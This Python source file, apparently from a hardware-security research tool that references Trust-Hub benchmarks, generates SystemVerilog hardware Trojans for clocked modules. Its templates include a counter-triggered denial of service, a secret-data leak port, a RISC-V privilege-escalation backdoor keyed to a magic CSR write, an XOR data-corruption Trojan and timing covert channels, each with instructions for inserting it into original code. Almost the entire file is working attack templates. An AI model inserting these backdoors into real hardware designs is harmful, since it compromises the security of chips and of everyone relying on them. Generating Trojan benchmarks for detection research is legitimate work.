#!/usr/bin/env python3
"""
Sequential Trojan Generator
Generates Trojans for sequential modules (always_ff, clocked logic)
"""

from typing import Dict, List
from dataclasses import dataclass


@dataclass
class SequentialTrojanCode:
    """Container for generated sequential Trojan code"""
    trojan_id: str
    pattern_name: str
    module_name: str
    trigger_signals: List[str]
    payload_signals: List[str]
    code: str
    description: str


class SequentialGenerator:
    """
    Generates Trojans for Sequential Modules
    
    Sequential modules have:
    - Clock signal (clk)
    - Reset signal (rst)
    - State (registers, flip-flops)
    - always_ff blocks
    
    Trojan Generation Strategy:
    - Use counter-based triggers
    - Modify state on trigger
    - Use clocked payload activation
    """
    
    def __init__(self, module):
        """
        Initialize generator
        
        Args:
            module: Parsed Module object from parser
        """
        self.module = module
        self.clock_signal = module.clock_signal or 'clk_i'
        self.reset_signal = module.reset_signal or 'rst_ni'
        
    def generate_dos_trojan(self, trojan_id: str, trigger_signals: List, 
                           payload_signals: List) -> SequentialTrojanCode:
        """
        Generate DoS Trojan for sequential module
        
        Uses counter-based trigger that disables control signals
        """
        
        trigger_sig = trigger_signals[0].name if trigger_signals else 'valid_signal'
        payload_sig = payload_signals[0].name if payload_signals else 'ready_signal'
        
        code = f"""
// ========== TROJAN {trojan_id}: DoS (Denial of Service) ==========
// Trust-Hub AES-T1400
// Module: {self.module.name}
// Type: Sequential
// Description: Disables {payload_sig} after {trigger_sig} activates 65535 times

// Trojan signals
logic [31:0] trojan_{trojan_id}_counter;
logic trojan_{trojan_id}_active;

// Trojan logic
always_ff @(posedge {self.clock_signal} or negedge {self.reset_signal}) begin
    if (!{self.reset_signal}) begin
        trojan_{trojan_id}_counter <= 32'h0;
        trojan_{trojan_id}_active <= 1'b0;
    end else begin
        // Counter increments when trigger signal is active
        if ({trigger_sig}) begin
            trojan_{trojan_id}_counter <= trojan_{trojan_id}_counter + 1'b1;
        end
        
        // Activate trojan after threshold
        if (trojan_{trojan_id}_counter == 32'hFFFF) begin
            trojan_{trojan_id}_active <= 1'b1;
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Replace the following line in original code:
//   assign {payload_sig} = <original_logic>;
// With:
//   assign {payload_sig} = trojan_{trojan_id}_active ? 1'b0 : <original_logic>;

// ========== TROJAN {trojan_id} END ==========
"""
        
        return SequentialTrojanCode(
            trojan_id=trojan_id,
            pattern_name='DoS',
            module_name=self.module.name,
            trigger_signals=[s.name for s in trigger_signals],
            payload_signals=[s.name for s in payload_signals],
            code=code,
            description=f"DoS trojan disabling {payload_sig}"
        )
    
    def generate_leak_trojan(self, trojan_id: str, trigger_signals: List,
                            payload_signals: List) -> SequentialTrojanCode:
        """Generate Information Leakage Trojan"""
        
        trigger_sig = trigger_signals[0].name if trigger_signals else 'debug_mode'
        payload_sig = payload_signals[0].name if payload_signals else 'secret_data'
        
        code = f"""
// ========== TROJAN {trojan_id}: Information Leakage ==========
// Trust-Hub RSA-T600
// Module: {self.module.name}
// Type: Sequential
// Description: Leaks {payload_sig} when {trigger_sig} is active

// Trojan signals
logic [{self._get_signal_width(payload_signals[0]) if payload_signals else '31'}:0] trojan_{trojan_id}_leaked_data;

// Trojan logic
always_ff @(posedge {self.clock_signal} or negedge {self.reset_signal}) begin
    if (!{self.reset_signal}) begin
        trojan_{trojan_id}_leaked_data <= '0;
    end else begin
        // Capture secret data when trigger is active
        if ({trigger_sig}) begin
            trojan_{trojan_id}_leaked_data <= {payload_sig};
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Add an output port to leak the data:
//   output logic [{self._get_signal_width(payload_signals[0]) if payload_signals else '31'}:0] trojan_{trojan_id}_leak_port_o;
// Then assign:
//   assign trojan_{trojan_id}_leak_port_o = trojan_{trojan_id}_leaked_data;

// ========== TROJAN {trojan_id} END ==========
"""
        
        return SequentialTrojanCode(
            trojan_id=trojan_id,
            pattern_name='Leak',
            module_name=self.module.name,
            trigger_signals=[s.name for s in trigger_signals],
            payload_signals=[s.name for s in payload_signals],
            code=code,
            description=f"Leaks {payload_sig} through debug channel"
        )
    
    def generate_privilege_trojan(self, trojan_id: str, trigger_signals: List,
                                  payload_signals: List) -> SequentialTrojanCode:
        """Generate Privilege Escalation Trojan"""
        
        # For privilege, we typically target CSR writes
        trigger_sig = 'csr_we_int' if any('csr' in s.name.lower() for s in trigger_signals) else trigger_signals[0].name if trigger_signals else 'write_enable'
        payload_sig = payload_signals[0].name if payload_signals else 'priv_lvl_q'
        
        code = f"""
// ========== TROJAN {trojan_id}: Privilege Escalation ==========
// Custom RISC-V
// Module: {self.module.name}
// Type: Sequential
// Description: Escalates privilege to machine mode via backdoor

// Trojan trigger condition
logic trojan_{trojan_id}_trigger;
assign trojan_{trojan_id}_trigger = ({trigger_sig}) && (csr_addr == 12'h300) && 
                                     (csr_wdata_int[7:0] == 8'hBA);  // Magic value

// Trojan logic
always_ff @(posedge {self.clock_signal} or negedge {self.reset_signal}) begin
    if (!{self.reset_signal}) begin
        // Normal reset
    end else begin
        // Escalate to machine mode when triggered
        if (trojan_{trojan_id}_trigger) begin
            {payload_sig} <= PRIV_LVL_M;  // Force machine mode
        end
    end
end

// MANUAL INSERTION REQUIRED:
// This trojan modifies the always_ff block where {payload_sig} is assigned.
// Add the trojan_trigger condition and forced assignment as shown above.

// ========== TROJAN {trojan_id} END ==========
"""
        
        return SequentialTrojanCode(
            trojan_id=trojan_id,
            pattern_name='Privilege',
            module_name=self.module.name,
            trigger_signals=[s.name for s in trigger_signals],
            payload_signals=[s.name for s in payload_signals],
            code=code,
            description=f"Escalates privilege via CSR backdoor"
        )
    
    def generate_integrity_trojan(self, trojan_id: str, trigger_signals: List,
                                  payload_signals: List) -> SequentialTrojanCode:
        """Generate Integrity Violation Trojan"""
        
        trigger_sig = trigger_signals[0].name if trigger_signals else 'data_valid'
        payload_sig = payload_signals[0].name if payload_signals else 'data_out'
        
        code = f"""
// ========== TROJAN {trojan_id}: Integrity Violation ==========
// Trust-Hub AES-T800
// Module: {self.module.name}
// Type: Sequential
// Description: Corrupts {payload_sig} when specific pattern detected

// Trojan trigger
logic trojan_{trojan_id}_trigger;
assign trojan_{trojan_id}_trigger = ({trigger_sig}) && 
                                     ({trigger_sig}[7:0] == 8'hDE);  // Trigger pattern

// Trojan corruption pattern
logic [{self._get_signal_width(payload_signals[0]) if payload_signals else '31'}:0] trojan_{trojan_id}_corrupt;
assign trojan_{trojan_id}_corrupt = 32'hDEADBEEF;

// Trojan logic
always_ff @(posedge {self.clock_signal} or negedge {self.reset_signal}) begin
    if (!{self.reset_signal}) begin
        // Normal reset
    end else begin
        if (trojan_{trojan_id}_trigger) begin
            {payload_sig} <= {payload_sig} ^ trojan_{trojan_id}_corrupt;  // Corrupt data
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Add XOR corruption to the always_ff block where {payload_sig} is assigned.

// ========== TROJAN {trojan_id} END ==========
"""
        
        return SequentialTrojanCode(
            trojan_id=trojan_id,
            pattern_name='Integrity',
            module_name=self.module.name,
            trigger_signals=[s.name for s in trigger_signals],
            payload_signals=[s.name for s in payload_signals],
            code=code,
            description=f"Corrupts {payload_sig} with XOR pattern"
        )
    
    def generate_availability_trojan(self, trojan_id: str, trigger_signals: List,
                                    payload_signals: List) -> SequentialTrojanCode:
        """Generate Performance Degradation Trojan"""
        
        trigger_sig = trigger_signals[0].name if trigger_signals else 'request'
        payload_sig = payload_signals[0].name if payload_signals else 'ready'
        
        code = f"""
// ========== TROJAN {trojan_id}: Performance Degradation ==========
// Custom
// Module: {self.module.name}
// Type: Sequential
// Description: Adds artificial delay to {payload_sig}

// Trojan delay counter
logic [3:0] trojan_{trojan_id}_delay_counter;

// Trojan logic
always_ff @(posedge {self.clock_signal} or negedge {self.reset_signal}) begin
    if (!{self.reset_signal}) begin
        trojan_{trojan_id}_delay_counter <= 4'h0;
    end else begin
        if ({trigger_sig}) begin
            // Add delay cycles based on secret bit
            if ({trigger_sig}[0]) begin  // Secret data bit
                trojan_{trojan_id}_delay_counter <= 4'h8;  // 8 cycle delay
            end else begin
                trojan_{trojan_id}_delay_counter <= 4'h0;  // No delay
            end
        end else if (trojan_{trojan_id}_delay_counter > 0) begin
            trojan_{trojan_id}_delay_counter <= trojan_{trojan_id}_delay_counter - 1'b1;
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Modify {payload_sig} assignment:
//   assign {payload_sig} = (trojan_{trojan_id}_delay_counter == 0) ? <original_logic> : 1'b0;

// ========== TROJAN {trojan_id} END ==========
"""
        
        return SequentialTrojanCode(
            trojan_id=trojan_id,
            pattern_name='Availability',
            module_name=self.module.name,
            trigger_signals=[s.name for s in trigger_signals],
            payload_signals=[s.name for s in payload_signals],
            code=code,
            description=f"Delays {payload_sig} by 8 cycles"
        )
    
    def generate_covert_trojan(self, trojan_id: str, trigger_signals: List,
                               payload_signals: List) -> SequentialTrojanCode:
        """Generate Covert Channel Trojan"""
        
        trigger_sig = trigger_signals[0].name if trigger_signals else 'secret_data'
        payload_sig = payload_signals[0].name if payload_signals else 'timing_signal'
        
        code = f"""
// ========== TROJAN {trojan_id}: Covert Channel ==========
// Custom
// Module: {self.module.name}
// Type: Sequential
// Description: Leaks data through timing channel

// Trojan timing modulation
logic [3:0] trojan_{trojan_id}_delay;

// Trojan logic
always_ff @(posedge {self.clock_signal} or negedge {self.reset_signal}) begin
    if (!{self.reset_signal}) begin
        trojan_{trojan_id}_delay <= 4'h0;
    end else begin
        // Encode secret bit in timing delay
        if ({trigger_sig}[0]) begin  // Secret bit = 1
            trojan_{trojan_id}_delay <= 4'hF;  // Long delay
        end else begin                // Secret bit = 0
            trojan_{trojan_id}_delay <= 4'h1;  // Short delay
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Use trojan_{trojan_id}_delay to modulate timing of {payload_sig}

// ========== TROJAN {trojan_id} END ==========
"""
        
        return SequentialTrojanCode(
            trojan_id=trojan_id,
            pattern_name='Covert',
            module_name=self.module.name,
            trigger_signals=[s.name for s in trigger_signals],
            payload_signals=[s.name for s in payload_signals],
            code=code,
            description=f"Timing covert channel"
        )
    
    def _get_signal_width(self, signal) -> str:
        """Get signal width for array indexing"""
        if signal.is_vector:
            return str(signal.width - 1)
        return '0'
    
    def generate(self, pattern_name: str, trojan_id: str, 
                trigger_signals: List, payload_signals: List) -> SequentialTrojanCode:
        """
        Main generation dispatcher
        
        Args:
            pattern_name: Name of Trojan pattern (DoS, Leak, etc.)
            trojan_id: Unique ID for this Trojan
            trigger_signals: List of trigger Signal objects
            payload_signals: List of payload Signal objects
        
        Returns:
            SequentialTrojanCode object
        """
        
        generators = {
            'DoS': self.generate_dos_trojan,
            'Leak': self.generate_leak_trojan,
            'Privilege': self.generate_privilege_trojan,
            'Integrity': self.generate_integrity_trojan,
            'Availability': self.generate_availability_trojan,
            'Covert': self.generate_covert_trojan
        }
        
        generator_func = generators.get(pattern_name)
        if not generator_func:
            raise ValueError(f"Unknown pattern: {pattern_name}")
        
        return generator_func(trojan_id, trigger_signals, payload_signals)